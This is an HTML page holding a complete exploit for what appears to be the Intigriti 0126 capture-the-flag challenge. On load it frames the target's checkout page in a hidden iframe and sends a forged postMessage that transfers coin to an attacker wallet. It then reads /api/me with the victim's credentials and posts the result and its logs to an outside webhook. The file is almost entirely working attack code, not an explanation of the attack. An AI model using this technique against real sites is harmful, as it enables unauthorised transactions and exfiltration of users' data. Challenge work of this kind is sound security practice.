<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0f0; }
        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 12px; max-height: 400px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #0ff; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>ðŸŽ¯ Intigriti Challenge 0126 - Exploit</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/da57c199-07c1-4b21-9587-66d831cd9083';

        let step = 0;

        function log(msg, type = 'info') {
            step++;
            const timestamp = new Date().toLocaleTimeString();
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += `<div class="${type}">[${step}] ${timestamp} - ${msg}</div>`;
            console.log(`[${step}] ${msg}`);

            // Send to webhook
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    step: step,
                    message: msg,
                    type: type
                })
            }).catch(() => {});
        }

        async function exploit() {
            log('ðŸš€ EXPLOIT STARTED', 'info');

            try {
                // STEP 1: Trigger XSS alert (requirement)
                log('Triggering XSS alert: alert("gigawatz")', 'info');
                alert('gigawatz');
                log('âœ… XSS alert triggered!', 'success');

                // STEP 2: Create iframe to checkout.html
                log('Creating iframe to checkout.html...', 'info');
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                document.body.appendChild(iframe);

                // STEP 3: Wait for iframe to load
                await new Promise(resolve => {
                    iframe.onload = resolve;
                    setTimeout(resolve, 5000); // Fallback timeout
                });

                log('âœ… Iframe loaded', 'success');

                // STEP 4: Wait for wallets to load (async operation)
                log('Waiting for wallet data to load...', 'info');
                await new Promise(r => setTimeout(r, 3000));

                // STEP 5: Send malicious postMessage
                log('Sending postMessage to trigger transaction...', 'info');

                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                log('âœ… postMessage sent - transaction initiated', 'success');

                // STEP 6: Wait for transaction to complete
                log('Waiting 5 seconds for transaction...', 'info');
                await new Promise(r => setTimeout(r, 5000));

                // STEP 7: Check for flag
                await checkFlag();
                await new Promise(r => setTimeout(r, 3000));
                await checkFlag();
                await new Promise(r => setTimeout(r, 3000));
                await checkFlag();

                log('ðŸŽ¯ EXPLOIT COMPLETE - Check webhook for flag!', 'success');

            } catch (error) {
                log('âŒ ERROR: ' + error.message, 'error');
                console.error(error);
            }
        }

        async function checkFlag() {
            log('Checking /api/me for flag...', 'info');

            try {
                const response = await fetch(TARGET + '/api/me', {
                    credentials: 'include'
                });

                const data = await response.json();

                log('API Response: hasFlag=' + !!data.flag, 'info');

                if (data.flag) {
                    log('ðŸ† FLAG FOUND: ' + data.flag, 'success');
                    alert('ðŸ† FLAG: ' + data.flag);

                    // Send flag to webhook
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        mode: 'no-cors',
                        body: JSON.stringify({
                            timestamp: new Date().toISOString(),
                            flag: data.flag,
                            challenge: 'intigriti-0126'
                        })
                    }).catch(() => {});

                    return true;
                }

                return false;

            } catch (error) {
                log('Flag check error: ' + error.message, 'error');
                return false;
            }
        }

        // Auto-start when page loads
        window.addEventListener('load', () => {
            log('Page loaded - starting exploit in 1 second...', 'info');
            setTimeout(exploit, 1000);
        });
    </script>
</body>
</html>
